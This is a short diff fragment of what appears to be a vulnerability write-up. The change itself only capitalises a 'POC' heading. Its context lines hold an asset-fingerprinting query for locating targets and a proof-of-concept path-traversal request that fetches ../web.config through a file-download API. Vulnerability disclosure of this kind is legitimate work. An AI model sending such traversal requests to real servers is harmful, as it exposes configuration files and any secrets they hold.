@@ -8,7 +8,7 @@
 body="css/markdown.css" && body="icon-512.png"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/File/Download?file=../web.config HTTP/1.1
